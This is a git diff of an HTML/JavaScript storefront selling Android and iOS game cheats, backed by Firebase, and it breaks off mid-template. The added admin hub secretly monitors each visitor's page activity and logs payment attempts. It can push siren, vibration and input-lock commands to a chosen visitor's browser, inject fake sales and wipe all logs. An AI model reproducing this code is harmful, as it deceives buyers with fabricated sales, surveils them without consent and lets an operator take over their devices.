@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>MAXIOM R4 | PRESTIGE GOLD EDITION</title>
+    <title>MAXIOM R4 | PRIVATE EDITION</title>
     
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
@@ -19,184 +19,756 @@
             appId: "1:221473460329:web:21a278a86cfdcff8b1d2f8",
             measurementId: "G-82WFV6S568"
         };
+        
         firebase.initializeApp(firebaseConfig);
         const db = firebase.database();
 
-        db.ref('settings/paypal_id').on('value', (snap) => {
-            const id = snap.val() || "test";
-            const s = document.createElement('script');
-            s.src = `https://www.paypal.com/sdk/js?client-id=${id}&currency=USD`;
-            document.head.appendChild(s);
-        });
+        (function() {
+            const checkBans = async () => {
+                try {
+                    const r = await fetch('https://api.ipify.org?format=json');
+                    const d = await r.json();
+                    const userIP = d.ip;
+                    db.ref('banned_ips').on('value', (snap) => {
+                        const list = snap.val() || [];
+                        if(list.includes(userIP)) {
+                            window.stop();
+                            document.documentElement.innerHTML = "";
+                            alert("IP TERMINATED BY SYSTEM ADMIN");
+                            window.location.href = "about:blank";
+                        }
+                    });
+                } catch(e) { console.log("Shield Active"); }
+            };
+            checkBans();
+
+            db.ref('settings/paypal_id').once('value', (snap) => {
+                const savedID = snap.val() || "test";
+                const script = document.createElement('script');
+                script.src = `https://www.paypal.com/sdk/js?client-id=${savedID}&currency=USD`;
+                document.head.appendChild(script);
+            });
+        })();
     </script>
 
     <style>
         :root {
             --primary: #ffd700;
             --secondary: #ff0000;
+            --matrix: rgba(0, 255, 65, 0.6);
             --bg-main: #050505;
-            --glass: rgba(0, 0, 0, 0.95);
-            --rare-gold-gradient: linear-gradient(135deg, #8a6d3b 0%, #f1da36 25%, #fdf5a6 50%, #f1da36 75%, #8a6d3b 100%);
+            --glass: rgba(0, 0, 0, 0.9);
+            --price-gold: #ffcc00;
         }
-        @keyframes gold-shimmer {
-            0% { background-position: 0% 50%; }
-            50% { background-position: 100% 50%; }
-            100% { background-position: 0% 50%; }
-        }
-        * { cursor: crosshair !important; box-sizing: border-box; -webkit-tap-highlight-color: transparent; outline: none; margin: 0; padding: 0; }
-        body { font-family: 'Courier New', monospace; color: white; background: var(--bg-main); overflow-x: hidden; padding-bottom: 100px; }
-        #loader-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 99999; display: flex; flex-direction: column; align-items: center; justify-content: center; }
-        .terminal-loader { width: 85%; max-width: 800px; background: #000; border: 2px solid #00ff41; padding: 30px; box-shadow: 0 0 20px #00ff41; }
-        #load-logs { color: #00ff41; height: 150px; overflow: hidden; font-size: 14px; line-height: 1.5; }
-        .load-bar-container { width: 100%; height: 10px; background: #111; border: 1px solid #00ff41; margin-top: 20px; }
-        #load-bar { width: 0%; height: 100%; background: #00ff41; transition: width 0.4s; }
-        .top-nav { position: fixed; top: 25px; left: 25px; z-index: 4000; display: flex; gap: 20px; }
-        .ui-btn { padding: 14px 24px; background: var(--primary); color: #000; border: 2px solid #fff; font-weight: bold; text-transform: uppercase; cursor: pointer; transition: 0.3s; }
-        .ui-btn:hover { background: #fff; transform: scale(1.1); }
-        .floating-cart { position: fixed; top: 25px; right: 25px; background: var(--primary); width: 80px; height: 80px; border-radius: 50%; display: flex; align-items: center; justify-content: center; cursor: pointer; z-index: 10000; border: 4px solid #fff; font-size: 30px; box-shadow: 0 0 20px rgba(255,215,0,0.5); }
-        .cart-count { position: absolute; top: -5px; right: -5px; background: var(--secondary); color: white; font-size: 18px; padding: 5px 11px; border-radius: 50%; border: 2px solid white; }
-        #global-canvas { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -2; }
-        header { font-size: 60px; font-weight: 900; color: var(--primary); text-align: center; padding: 60px 0; letter-spacing: 10px; text-shadow: 0 0 15px var(--primary); }
-        .cat-label { margin: 40px auto; padding: 20px; background: var(--glass); border-top: 3px solid var(--primary); border-bottom: 3px solid var(--primary); max-width: 1000px; font-size: 30px; color: var(--primary); text-align: center; letter-spacing: 5px; }
-        .product-grid { display: flex; flex-wrap: wrap; justify-content: center; gap: 30px; padding: 20px; }
-        .product { background: var(--glass); padding: 25px; width: 280px; border: 1px solid #333; text-align: center; transition: 0.4s; }
-        .product:hover { border-color: var(--primary); transform: translateY(-10px); }
 
-        #page-3 {
-            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: var(--rare-gold-gradient); background-size: 400% 400%;
-            animation: gold-shimmer 15s ease infinite; z-index: 15000; padding: 40px; overflow-y: auto; color: #000;
+        @keyframes screen-glitch {
+            0% { transform: translate(0); }
+            20% { transform: translate(-8px, 5px); filter: hue-rotate(90deg); }
+            40% { transform: translate(8px, -5px); filter: separation(2px); }
+            60% { transform: translate(-5px, 0); filter: invert(0.2); }
+            80% { transform: translate(5px, 5px); }
+            100% { transform: translate(0); }
         }
-        .payment-card { background: white; border-radius: 20px; padding: 40px; max-width: 600px; margin: 40px auto; border: 8px solid #000; box-shadow: 0 20px 50px rgba(0,0,0,0.5); }
-        .method-box { border: 3px solid #ddd; padding: 15px; margin-bottom: 15px; cursor: pointer; display: flex; align-items: center; gap: 15px; transition: 0.2s; font-weight: bold; }
-        .method-box.active { border-color: #000; background: #fffde7; }
-        .finish-btn { width: 100%; padding: 20px; font-size: 20px; font-weight: 900; background: #000; color: #ffd700; border: none; cursor: pointer; margin-top: 20px; text-transform: uppercase; }
-        .crypto-box { background: #000; color: #ffd700; padding: 15px; border-radius: 5px; word-break: break-all; margin-top: 10px; font-family: monospace; font-size: 12px; }
-        .admin-box { display: none; position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: #000; z-index: 20000; padding: 40px; overflow-y: auto; }
-        .admin-input { background: #1a1a1a; border: 1px solid #333; color: #fff; padding: 15px; margin: 10px 0; width: 100%; font-family: monospace; }
+        .glitching { animation: screen-glitch 0.15s infinite; }
+        .neon-glow * { text-shadow: 0 0 15px var(--primary) !important; }
+        .neon-glow .product, .neon-glow .ui-btn, .neon-glow .panel-box { box-shadow: 0 0 15px var(--primary); }
+
+        * { cursor: crosshair !important; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+        body { margin: 0; font-family: 'Courier New', monospace; color: white; text-align: center; background: var(--bg-main); transition: 0.5s; overflow-x: hidden; padding-bottom: 80px; }
+        
+        #input-lock-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 1000000; background: rgba(0,0,0,0.2); cursor: not-allowed !important; pointer-events: all; }
+
+        #global-alert-banner { display: none; position: fixed; top: 0; left: 0; width: 100%; background: var(--secondary); color: white; padding: 10px; z-index: 100000; font-weight: bold; border-bottom: 2px solid white; }
+
+        #loader-overlay {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: #000; z-index: 99999; display: flex; flex-direction: column;
+            align-items: center; justify-content: center;
+        }
+        .terminal-loader {
+            width: 80%; max-width: 600px; height: 300px; background: #000;
+            border: 1px solid #00ff41; padding: 20px; text-align: left;
+            font-size: 14px; overflow: hidden; position: relative;
+            box-shadow: 0 0 30px rgba(0, 255, 65, 0.2);
+        }
+        .skull-ascii { color: #ffd700; font-size: 8px; line-height: 8px; white-space: pre; margin-bottom: 15px; text-align: center;}
+        #load-logs { color: #00ff41; height: 180px; overflow: hidden; }
+        .load-bar-container { width: 100%; height: 10px; background: #111; border: 1px solid #00ff41; margin-top: 20px; position: relative; }
+        #load-bar { width: 0%; height: 100%; background: #00ff41; box-shadow: 0 0 10px #00ff41; transition: 0.2s; }
+
+        #global-canvas { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -2; background: var(--bg-main); }
+
+        .header-container { padding: 50px 0; }
+        header { font-size: 50px; font-weight: bold; color: var(--primary); text-shadow: 0 0 20px var(--primary); letter-spacing: 10px; }
+
+        .top-nav { position: fixed; top: 20px; left: 20px; z-index: 4000; display: flex; gap: 10px; }
+        .ui-btn { padding: 10px 15px; background: var(--primary); color: #000; border: 2px solid #fff; font-weight: bold; border-radius: 5px; font-size: 12px; cursor: pointer; }
+
+        .floating-cart {
+            position: fixed; top: 20px; right: 20px; background: var(--primary); width: 70px; height: 70px;
+            border-radius: 50%; display: flex; align-items: center; justify-content: center; cursor: pointer;
+            z-index: 10000; color: black; box-shadow: 0 0 25px var(--primary); border: 3px solid #fff;
+            font-size: 24px;
+        }
+        .cart-count { position: absolute; top: -5px; right: -5px; background: var(--secondary); color: white; font-size: 14px; padding: 5px 9px; border-radius: 50%; }
+
+        #chat-widget { position: fixed; bottom: 60px; right: 20px; width: 300px; height: 400px; background: var(--glass); border: 2px solid var(--primary); z-index: 9998; display: none; flex-direction: column; border-radius: 10px; overflow: hidden; }
+        #chat-header { background: var(--primary); color: #000; padding: 10px; font-weight: bold; display: flex; justify-content: space-between; }
+        #chat-msgs { flex: 1; overflow-y: auto; padding: 10px; font-size: 12px; text-align: left; }
+        .chat-input-wrap { display: flex; border-top: 1px solid #333; }
+        #chat-input { flex: 1; border: none; padding: 10px; background: #111; color: #fff; }
+
+        .cat-label { margin: 40px auto; padding: 15px; background: var(--glass); border-top: 2px solid var(--primary); border-bottom: 2px solid var(--primary); max-width: 900px; font-size: 28px; font-weight: bold; color: var(--primary); }
+        .product-grid { display: flex; flex-wrap: wrap; justify-content: center; gap: 25px; padding: 20px; }
+        .product { background: var(--glass); padding: 20px; width: 260px; border: 1px solid #333; border-radius: 10px; transition: 0.3s; }
+        .product:hover { transform: translateY(-10px); border-color: var(--primary); }
+        .product img { width: 100%; height: 160px; object-fit: cover; border-radius: 5px; }
+
+        .admin-box { display: none; position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: #000; z-index: 20000; padding: 40px; overflow-y: auto; text-align: left; }
+        .admin-layout { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 20px; }
+        .panel-box { background: #080808; border: 1px solid #333; padding: 20px; border-radius: 8px; }
+        .panel-box h3 { color: var(--primary); margin-top: 0; border-bottom: 1px solid #222; padding-bottom: 10px; }
+        input, select, textarea { background: #111; border: 1px solid var(--primary); color: #fff; padding: 10px; margin: 5px 0; width: 100%; border-radius: 4px; }
+
+        #auth-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 60000; flex-direction: column; align-items: center; justify-content: center; }
+
+        .intel-ticker-wrap { position: fixed; bottom: 0; left: 0; width: 100%; height: 45px; background: rgba(0,0,0,0.9); border-top: 2px solid var(--primary); z-index: 9999; display: flex; align-items: center; }
+        .intel-ticker-label { background: var(--primary); color: #000; font-weight: bold; padding: 0 15px; height: 100%; display: flex; align-items: center; }
+        
+        @media (max-width: 768px) {
+            header { font-size: 30px; letter-spacing: 4px; padding: 20px 0; }
+            .header-container { padding: 30px 0; }
+            .product { width: 45%; min-width: 160px; padding: 10px; gap: 10px; }
+            .product img { height: 120px; }
+            .product h3 { font-size: 14px; }
+            .cat-label { font-size: 20px; padding: 10px; width: 95%; }
+            .top-nav { top: auto; bottom: 65px; left: 10px; right: 10px; justify-content: center; gap: 5px; }
+            .ui-btn { padding: 8px; font-size: 10px; flex: 1; }
+            .floating-cart { width: 55px; height: 55px; font-size: 18px; top: 10px; right: 10px; }
+            .cart-count { font-size: 10px; padding: 3px 6px; }
+            .terminal-loader { width: 95%; height: 350px; font-size: 11px; }
+            .skull-ascii { font-size: 5px; line-height: 5px; }
+            .admin-box { padding: 15px; }
+            #chat-widget { width: 90%; right: 5%; bottom: 120px; }
+        }
     </style>
 </head>
 <body onclick="startAudio()">
+
+<div id="input-lock-overlay"></div>
+<div id="global-alert-banner"></div>
+
 <div id="loader-overlay">
     <div class="terminal-loader">
+        <div class="skull-ascii">
+        .-'''-.
+       / _   _ \
+      | ( ' ) |
+      |(_ o _)|
+       '.(_).-'
+        /   \
+       |     |
+        \___/
+        </div>
         <div id="load-logs"></div>
         <div class="load-bar-container"><div id="load-bar"></div></div>
     </div>
+    <div id="load-text" style="color: #00ff41; margin-top: 15px; font-weight: bold;">[ ROOT ACCESS GRANTED ]</div>
 </div>
+
 <canvas id="global-canvas"></canvas>
-<div class="top-nav"><button class="ui-btn" onclick="showShop()">[ HOME ]</button></div>
-<div class="floating-cart" onclick="showPage3()">🛒 <span class="cart-count" id="cart-count">0</span></div>
-<header>SPR SHOP ARK R4</header>
+
+<div id="auth-overlay">
+    <h1 style="color:var(--primary); letter-spacing: 5px;">AUTHORIZING TRANSACTION</h1>
+    <div id="paypal-button-container" style="width: 100%; max-width: 400px; margin: 20px;"></div>
+    <button onclick="document.getElementById('auth-overlay').style.display='none'" class="ui-btn" style="background:red; color:white;">CANCEL SESSION</button>
+</div>
+
+<div class="top-nav">
+    <button class="ui-btn" id="music-btn" onclick="toggleMusic(event)">🔊 MUSIC: ON</button>
+    <button class="ui-btn" onclick="toggleChat()">💬 CHAT</button>
+</div>
+
+<div id="chat-widget">
+    <div id="chat-header">
+        <span id="chat-title">SECURE BRIDGE</span> 
+        <span onclick="toggleChat()" style="cursor:pointer">X</span>
+    </div>
+    <div id="chat-msgs"></div>
+    <div class="chat-input-wrap">
+        <input type="text" id="chat-input" placeholder="Message Admin..." onkeydown="if(event.key==='Enter') sendChat()">
+        <button onclick="sendChat()" style="background:var(--primary); border:none; padding:10px; cursor:pointer">></button>
+    </div>
+</div>
+
+<div class="floating-cart" onclick="showCheckout()">
+    🛒 <span class="cart-count" id="cart-count">0</span>
+</div>
+
+<div class="header-container">
+    <header id="main-header-text" onclick="showShop()" style="cursor:pointer;">SPR SHOP ARK R4</header>
+</div>
+
 <div id="shop-page">
-    <div class="cat-label">ANDROID MODULES</div><div id="android-grid" class="product-grid"></div>
-    <div class="cat-label">IOS MODULES</div><div id="ios-grid" class="product-grid"></div>
+    <div class="cat-label">ANDROID CHEATS</div>
+    <div id="android-grid" class="product-grid"></div>
+    <div class="cat-label">IOS CHEATS</div>
+    <div id="ios-grid" class="product-grid"></div>
 </div>
-<div id="page-3">
-    <div class="payment-card">
-        <button onclick="showShop()" style="background:none; border:none; cursor:pointer; font-weight:bold; margin-bottom: 20px;">⬅ BACK TO SHOP</button>
-        <h1 style="text-align:center; margin-bottom: 20px;">SECURE CHECKOUT</h1>
-        <div id="cart-summary" style="margin-bottom: 20px; border-top: 2px solid #000; padding-top: 20px;"></div>
-        <h2 id="p3-total" style="text-align:center; font-size:50px; margin-bottom:30px;">$0.00</h2>
-        <div class="method-box active" id="btn-pay-paypal" onclick="selectMethod('paypal')">🔵 <b>PAYPAL / DEBIT</b></div>
-        <div id="paypal-area"><div id="paypal-button-container"></div></div>
-        <div class="method-box" id="btn-pay-cc" onclick="selectMethod('cc')">💳 <b>CREDIT CARD</b></div>
-        <div id="cc-area" style="display:none;">
-            <input type="text" placeholder="CARD NUMBER" class="admin-input" style="background:#eee; color:#000;">
-            <button class="finish-btn" onclick="alert('PROCESSING...')">FINISH PAYMENT</button>
-        </div>
-        <div class="method-box" id="btn-pay-crypto" onclick="selectMethod('crypto')">₿ <b>CRYPTOCURRENCY</b></div>
-        <div id="crypto-area" style="display:none;">
-            <p>BTC ADDRESS:</p><div class="crypto-box" id="btc-disp">...</div>
-            <p style="margin-top:10px;">LTC ADDRESS:</p><div class="crypto-box" id="ltc-disp">...</div>
-            <button class="finish-btn" onclick="alert('CONFIRMING...')">I HAVE SENT PAYMENT</button>
-        </div>
+
+<div id="checkout-page" style="display:none; padding:50px;">
+    <button onclick="showShop()" class="ui-btn">⬅ RETURN TO SHOP</button>
+    <div style="max-width:600px; margin:40px auto; background:var(--glass); padding:30px; border:2px solid var(--primary);">
+        <h2 style="color:var(--primary)">YOUR CART</h2>
+        <div id="cart-list" style="text-align:left; min-height:100px;"></div>
+        <button onclick="clearCart()" class="ui-btn" style="background:red; color:white; margin-bottom:10px;">EMPTY CART</button>
+        <hr style="border:1px solid #222;">
+        <input type="text" id="apply-coupon" placeholder="COUPON_CODE">
+        <button onclick="applyCoupon()" class="ui-btn" style="width:100%; margin-top:10px;">VALIDATE CODE</button>
+        <h1 id="total-usd" style="color:var(--price-gold)">TOTAL: $0</h1>
+        <button onclick="triggerHackerPay()" style="width:100%; background:var(--primary); color:black; padding:20px; font-weight:bold; border:none; cursor:pointer; font-size:18px;">⚔️ FINISH PURCHASE</button>
     </div>
 </div>
+
+<div id="info-page" style="display:none; padding:50px;">
+    <button onclick="showShop()" class="ui-btn">⬅ BACK</button>
+    <div style="max-width: 800px; margin: 40px auto; background: var(--glass); border: 2px solid var(--primary); padding: 30px; border-radius: 15px;">
+        <img id="info-img" style="width:100%; border-radius:10px; margin-bottom:20px; object-fit: contain;">
+        <h1 id="info-title" style="color:var(--primary)"></h1>
+        <h2 id="info-price" style="color:var(--price-gold)"></h2>
+        <p id="info-desc" style="line-height:1.6; font-size:18px;"></p>
+        <div id="info-btns" style="display:flex; flex-direction: column; gap:10px; justify-content:center;"></div>
+    </div>
+</div>
+
 <div class="admin-box" id="admin-terminal">
-    <h2 style="color:red; letter-spacing:5px;">ROOT COMMAND SYSTEM</h2>
-    <div id="login-section">
-        <input type="password" id="admin-pass" class="admin-input" placeholder="ENTER MASTER KEY">
-        <button class="ui-btn" onclick="login()">DECRYPT ACCESS</button>
+    <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 30px;">
+        <h2 style="color:var(--secondary); margin:0;">R4_COMMAND_HUB</h2>
+        <button onclick="closeAdmin()" class="ui-btn" style="background:red;">EXIT_ROOT</button>
     </div>
-    <div id="admin-controls" style="display:none;">
-        <h3 style="color:var(--primary); margin-top:20px;">WALLET CONFIG</h3>
-        <input type="text" id="wallet-btc" class="admin-input" placeholder="BTC">
-        <input type="text" id="wallet-ltc" class="admin-input" placeholder="LTC">
-        <input type="text" id="wallet-paypal" class="admin-input" placeholder="PAYPAL ID">
-        <button class="ui-btn" onclick="saveWallets()">SAVE SETTINGS</button>
-        <h3 style="color:var(--primary); margin-top:20px;">ADD PRODUCT</h3>
-        <input type="text" id="p-name" class="admin-input" placeholder="NAME">
-        <input type="number" id="p-price" class="admin-input" placeholder="PRICE">
-        <select id="p-cat" class="admin-input"><option value="android">Android</option><option value="ios">iOS</option></select>
-        <button class="ui-btn" onclick="addProduct()">DEPLOY MODULE</button>
+
+    <div id="login-section" style="text-align:center; padding-top:100px;">
+        <input type="password" id="admin-pass" placeholder="MASTER ROOT KEY" style="max-width:400px; font-size: 20px;">
+        <button onclick="login()" class="ui-btn" style="width:400px; margin-top:20px; display:block; margin-left:auto; margin-right:auto;">DECRYPT HUB</button>
     </div>
-    <button class="ui-btn" onclick="document.getElementById('admin-terminal').style.display='none'" style="margin-top:50px; background:red; color:white;">CLOSE</button>
+
+    <div id="admin-controls" style="display:none;" class="admin-layout">
+        <div class="panel-box">
+            <h3>📡 INTEL (CLICK TO BRIDGE)</h3>
+            <div id="pay-attempts-list" style="font-size:11px; color:yellow; background:#111; padding:10px; height:150px; overflow-y:auto; border:1px solid #333;">Scanning...</div>
+            <button onclick="db.ref('intel').set(null)" class="ui-btn" style="width:100%; background:red; margin-top:5px;">WIPE INTEL</button>
+            <h3 style="margin-top:20px;">🎟️ COUPONS</h3>
+            <input type="text" id="c-code" placeholder="CODE">
+            <input type="number" id="c-perc" placeholder="DISCOUNT %">
+            <button onclick="addCoupon()" class="ui-btn" style="width:100%;">GENERATE</button>
+        </div>
+        
+        <div class="panel-box">
+            <h3>⚒️ ARSENAL FORGE</h3>
+            <input type="hidden" id="edit-index" value="-1">
+            <input type="text" id="p-name" placeholder="PRODUCT NAME">
+            <input type="number" id="p-price" placeholder="PRICE">
+            <input type="text" id="p-yt" placeholder="YOUTUBE VIDEO ID">
+            <select id="p-cat"><option value="android">Android</option><option value="ios">IOS</option></select>
+            <textarea id="p-desc" placeholder="PRODUCT DESCRIPTION" style="height:60px;"></textarea>
+            <label style="font-size:10px; color:var(--primary);">Image & File:</label>
+            <input type="file" id="p-img" accept="image/*">
+            <input type="file" id="p-file">
+            <button id="forge-btn" onclick="addProduct()" class="ui-btn" style="width:100%; margin-top:5px;">DEPLOY ASSET</button>
+            <button id="cancel-edit-btn" onclick="resetForge()" class="ui-btn" style="width:100%; margin-top:5px; background:gray; display:none;">CANCEL</button>
+            <div id="admin-asset-list" style="max-height:100px; overflow-y:auto; margin-top:10px; border:1px solid #333; background:#000;"></div>
+        </div>
+
+        <div class="panel-box" style="border-color: #ff0000;">
+            <h3 style="color:#ff0000;">💀 BEAST OVERRIDE</h3>
+            <button onclick="toggleKillSwitch()" id="kill-btn" style="width:100%; background:white; color:black; font-weight:bold; padding:10px; border:none; cursor:pointer;">ACTIVATE LOCKDOWN</button>
+            
+            <p style="font-size:10px; color:white; margin-top:15px;">TARGET CONTROL (MANUAL ID)</p>
+            <input type="text" id="manual-target-id" placeholder="Enter ID (e.g. 192)" oninput="chatTarget = this.value; document.getElementById('active-target-display').innerText = 'Target: User_' + this.value;">
+            
+            <p style="font-size:10px; color:white; margin-top:10px;">FLASH-BANG MESSAGE</p>
+            <input type="text" id="alert-msg" placeholder="Warning Message...">
+            <button onclick="sendFlashBang()" class="ui-btn" style="width:100%; background:purple; color:white;">SEND ALERT</button>
+
+            <p style="font-size:10px; color:#ff0000; margin-top:15px; border-top:1px solid #333; padding-top:5px;">VOODOO COMMANDS</p>
+            <div style="display:grid; grid-template-columns: 1fr 1fr; gap:5px;">
+                <button onclick="sendPower('siren')" class="ui-btn" style="background:#ff4400; color:white;">SIREN</button>
+                <button onclick="sendPower('vibrate')" class="ui-btn" style="background:#ffcc00; color:black;">VIBRATE</button>
+                <button onclick="sendPower('lock')" class="ui-btn" style="background:red; color:white;">LOCK</button>
+                <button onclick="sendPower('unlock')" class="ui-btn" style="background:lime; color:black;">UNLOCK</button>
+            </div>
+
+            <div style="margin-top:15px; background:#111; padding:10px; border:1px solid #333; text-align:center;">
+                <span style="font-size:10px;">ACTIVE GHOSTS: </span>
+                <span id="ghost-count" style="color:lime; font-weight:bold;">0</span>
+            </div>
+            
+            <button onclick="generateFakeSale()" class="ui-btn" style="width:100%; margin-top:10px; background:orange;">INJECT FAKE SALE</button>
+            <button onclick="vacuumDatabase()" style="width:100%; margin-top:10px; background:transparent; border:1px solid red; color:red; font-size:10px; cursor:pointer;">[ WIPE ALL LOGS ]</button>
+        </div>
+
+        <div class="panel-box">
+            <h3 style="color:cyan;">📢 SYSTEM BROADCAST</h3>
+            <input type="text" id="broadcast-input" placeholder="ALERT BANNER MESSAGE">
+            <div style="display:flex; gap:5px;">
+                <button onclick="db.ref('settings/broadcast').set(document.getElementById('broadcast-input').value)" class="ui-btn" style="flex:2; background:cyan; color:black;">UPDATE</button>
+                <button onclick="document.getElementById('broadcast-input').value=''; db.ref('settings/broadcast').set(null)" class="ui-btn" style="flex:1; background:#333; color:white;">CLEAR</button>
+            </div>
+            <h3 style="margin-top:20px; color:var(--secondary);">🛡️ SECURITY</h3>
+            <input type="text" id="ban-ip-input" placeholder="IP TO BLOCK">
+            <button onclick="banClientIP()" class="ui-btn" style="width:100%; background:red; color:white;">BLOCK IP</button>
+            <div id="active-target-display" style="color:lime; font-size:10px; margin-top:10px;">Target: User_Self</div>
+            <button onclick="resetTarget()" class="ui-btn" style="width:100%; margin-top:5px; background:gray;">RESET BRIDGE</button>
+        </div>
+    </div>
 </div>
+
+<div id="pgup-menu" style="display:none; position:fixed; top:50%; left:50%; transform:translate(-50%, -50%); width:350px; background:#000; border:3px solid var(--primary); z-index:100000; padding:20px; border-radius:10px; box-shadow:0 0 30px var(--primary); font-family:monospace; max-height: 90vh; overflow-y: auto;">
+    <h2 style="color:var(--primary); margin-top:0; border-bottom: 1px solid var(--primary);">UI COMMAND CENTER</h2>
+    <p style="font-size:10px; margin-top:10px;">PRIMARY THEME COLOR</p>
+    <input type="color" id="color-picker" style="width:100%; height:40px; background:transparent; border:1px solid #333;">
+    <p style="font-size:10px; margin-top:15px;">SHOP TITLE</p>
+    <input type="text" id="title-input" placeholder="New Shop Name..." style="width:100%; padding:10px; background:#111; color:#fff; border:1px solid var(--primary);">
+    <p style="font-size:10px; margin-top:15px;">MATRIX VELOCITY</p>
+    <input type="range" id="ui-matrix-speed" min="20" max="150" value="50" style="width:100%;">
+    <p style="font-size:10px; margin-top:15px;">NEON OVERDRIVE</p>
+    <select id="ui-glow" style="width:100%; padding:5px; background:#111; color:white; border:1px solid var(--primary);">
+        <option value="off">OFF</option>
+        <option value="on">ON (EXTREME)</option>
+    </select>
+    <p style="font-size:10px; margin-top:15px;">SYSTEM FONT</p>
+    <select id="ui-font" style="width:100%; padding:5px; background:#111; color:white; border:1px solid var(--primary);">
+        <option value="'Courier New', monospace">COURIER</option>
+        <option value="Arial, sans-serif">SANS</option>
+    </select>
+    <button onclick="triggerGlobalGlitch()" style="width:100%; margin-top:20px; padding:10px; background:red; color:white; font-weight:bold; border:none; cursor:pointer;">⚠️ TRIGGER SYSTEM GLITCH</button>
+    <hr style="border:0.5px solid #333; margin:20px 0;">
+    <button onclick="applyGlobalChanges()" style="width:100%; padding:15px; background:var(--primary); color:#000; font-weight:bold; border:none; cursor:pointer;">APPLY GLOBALLY</button>
+    <button onclick="document.getElementById('pgup-menu').style.display='none'" style="width:100%; margin-top:10px; background:transparent; color:gray; border:none; cursor:pointer;">[ CLOSE ]</button>
+</div>
+
+<div class="intel-ticker-wrap">
+    <div class="intel-ticker-label" id="live-feed-label">LIVE_FEED</div>
+    <marquee id="feed-text" style="color:#0f0; font-weight:bold;">>>> R4 FUSION SYSTEM STABLE :: ENCRYPTION ACTIVE...</marquee>
+</div>
+
 <audio id="hacker-music" loop><source src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3"></audio>
+<audio id="siren-sound" src="https://www.myinstants.com/media/sounds/strobe-warning.mp3"></audio>
+<audio id="snd-click" src="https://www.myinstants.com/media/sounds/sword-slash.mp3"></audio>
+
 <script>
-let products = [], cart = [];
-function showShop() { document.getElementById('shop-page').style.display='block'; document.getElementById('page-3').style.display='none'; }
-function showPage3() { if(cart.length===0) return; document.getElementById('shop-page').style.display='none'; document.getElementById('page-3').style.display='block'; renderP3(); }
-function selectMethod(m) {
-    document.getElementById('paypal-area').style.display = (m==='paypal')?'block':'none';
-    document.getElementById('cc-area').style.display = (m==='cc')?'block':'none';
-    document.getElementById('crypto-area').style.display = (m==='crypto')?'block':'none';
-    document.querySelectorAll('.method-box').forEach(el=>el.classList.remove('active'));
-    document.getElementById('btn-pay-'+m).classList.add('active');
+let products = [], cart = [], coupons = {}, isAdmin = false, discount = 0, musicStarted = false;
+let userIP = "Scanning...", userID = "Unknown", chatTarget = "NONE";
+let matrixInt;
+
+function toggleChat() { let c = document.getElementById('chat-widget'); c.style.display = (c.style.display==='flex')?'none':'flex'; }
+function closeAdmin() { document.getElementById('admin-terminal').style.display='none'; }
+
+function sendChat() {
+    let inp = document.getElementById('chat-input');
+    if(!inp.value.trim()) return;
+    let room = isAdmin ? chatTarget : userID;
+    if(room === "NONE") return alert("SELECT A TARGET FIRST");
+    db.ref(`private_chats/${room}`).push({ sender: isAdmin ? "ADMIN" : `User_${userID}`, msg: inp.value, time: Date.now() });
+    inp.value = "";
 }
-function renderP3() {
-    let t=0, h=""; cart.forEach(i=>{ h+=`<div style="display:flex; justify-content:space-between;"><span>${i.name}</span><b>$${i.price}</b></div>`; t+=parseFloat(i.price); });
-    document.getElementById('cart-summary').innerHTML = h;
-    document.getElementById('p3-total').innerText = "$"+t.toFixed(2);
-    db.ref('settings/wallets').once('value', s=>{
-        const w = s.val() || {};
-        document.getElementById('btc-disp').innerText = w.btc || "N/A";
-        document.getElementById('ltc-disp').innerText = w.ltc || "N/A";
+
+function syncChat() {
+    let room = isAdmin ? chatTarget : userID;
+    if(room === "NONE") return;
+    db.ref(`private_chats/${room}`).off();
+    db.ref(`private_chats/${room}`).on('value', s => {
+        let list = s.val() ? Object.values(s.val()) : [];
+        document.getElementById('chat-msgs').innerHTML = list.map(m => m.msg ? `<div style="margin-bottom:5px;"><b style="color:${m.sender === "ADMIN" ? "#00ff00" : "var(--primary)"}">${m.sender}</b>: ${m.msg}</div>` : '').join('');
+        let div = document.getElementById('chat-msgs'); div.scrollTop = div.scrollHeight;
     });
 }
+
+function targetUser(targetID) { 
+    chatTarget = targetID; 
+    document.getElementById('manual-target-id').value = targetID;
+    document.getElementById('active-target-display').innerText = "Target: User_" + targetID; 
+    document.getElementById('chat-title').innerText = "BRIDGE: User_" + targetID; 
+    syncChat(); 
+    if(document.getElementById('chat-widget').style.display !== 'flex') toggleChat(); 
+}
+
+// ==========================================
+// FIXED GHOST MONITOR LOGIC (DIRECT SYNC)
+// ==========================================
+function openGhostView(targetID) {
+    const gW = window.open('', '_blank', 'width=450,height=500');
+    gW.document.write(`
+        <html>
+        <head>
+            <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"><\/script>
+            <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"><\/script>
+        </head>
+        <body style="background:#050505; color:#0f0; font-family:monospace; padding:20px; overflow-x:hidden;">
+            <h2 style="color:yellow; border-bottom:1px solid #333; padding-bottom:10px;">GHOST MONITOR: User_${targetID}</h2>
+            <div id="status" style="margin-top:20px;">
+                <p>STATUS: <span id="conn-state" style="color:red;">CONNECTING...</span></p>
+                <p>CURRENT PAGE: <span id="p" style="color:white; font-weight:bold;">-</span></p>
+                <p>LAST ACTIVE: <span id="a" style="color:white;">-</span></p>
+                <div style="background:#111; padding:15px; border:1px solid #333; margin-top:20px; border-radius:5px;">
